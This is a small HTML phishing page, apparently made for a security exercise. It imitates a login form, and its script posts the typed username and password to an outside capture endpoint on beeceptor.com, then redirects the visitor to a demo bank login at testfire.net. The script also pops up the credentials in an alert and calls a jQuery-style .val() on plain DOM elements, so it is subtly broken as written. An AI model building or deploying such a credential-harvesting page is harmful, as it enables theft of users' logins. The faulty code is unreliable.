<!DOCTYPE html>
<html>

<head>
<title>Login</title>
</head>

<body>

<h1>Login</h1>

<input id="username" placeholder="Username">
<br/><br/>
<input type="password" id="password" placeholder="Password">
<br/><br/>
<button onclick="onLogin()">Login</button>

<div id="resultContainer">

</div>

<style>
    body {
        background-color: black;
        color: white;
        text-align: center;
    }

    input {
        min-width: 300px;
    }
</style>


</body>
<script>
function onLogin(){
    var uid=document.getElementById("username").val();
    var pwd= document.getElementById("password").val()
    alert(uid+""+pwd);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://it-security.free.beeceptor.com/my/api/path", true);    

    xhr.send(JSON.stringify({
        uid: uid,passw:pwd
    }));
    xhr.onload = function() {
      var data = JSON.parse(this.responseText);
      console.log(data);
      window.location.href="https://demo.testfire.net/login.jsp"
}}
</script>
</html>
